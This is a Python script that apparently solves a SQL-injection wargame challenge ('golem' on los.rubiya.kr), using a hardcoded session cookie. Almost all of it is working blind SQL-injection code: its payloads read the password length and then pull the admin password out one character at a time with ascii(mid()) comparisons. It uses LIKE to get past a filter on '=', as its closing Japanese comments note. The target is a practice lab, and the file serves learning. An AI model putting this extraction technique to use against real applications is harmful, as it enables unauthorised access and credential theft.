#!/usr/bin/python3
# -*- coding: utf-8 -*-

import requests
import re
from termcolor import colored
from bs4 import BeautifulSoup as bs
import sys, getopt
import urllib.parse

url = "https://los.rubiya.kr/chall/golem_4b5202cfedd8160e73124b5234235ef5.php"
parameter = 'pw'
cookie = dict(PHPSESSID='lqjdocrtrts7s5gl84ruvmc5aa')

# Check the length of password

for i in range(1,10):
    sql = "' || length(pw) LIKE {} -- -".format(i)
    sql = urllib.parse.quote(sql)
    query_url = "%s?%s=%s" % (url,parameter,sql)
    print("[*]%s" % query_url)

    http_request=requests.get(query_url,cookies=cookie)
    res = bs(http_request.text,"html.parser")

    if "Hello admin" in res.text:
        print("password length: {}".format(i))
        password_length = i 

common = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~'
passwd = ''

for i in range(1,password_length+1):
    for j in common:

        sqli = ("' || id LIKE 'admin' && ascii(mid(pw,%d,%d)) LIKE %d -- -" % (i,i,ord(j)))
        sqli = urllib.parse.quote(sqli)

        query_url = "%s?%s=%s" % (url,parameter,sqli)
        print("[*]%s" % query_url)

        http_request=requests.get(query_url,cookies=cookie)
        res = bs(http_request.text,"html.parser")

        if "Hello admin" in res.text:
            passwd += j 
            print('password: %s' % passwd)
            break
            
        elif j in common[-1]:
            # the end of string that means the password is found
            print('password: %s' % passwd)
            exit(1)

# = が使えないなら、LIKEが同じものになる
# length(pw)で、pwの長さが分かる。
# substr() = mid()関数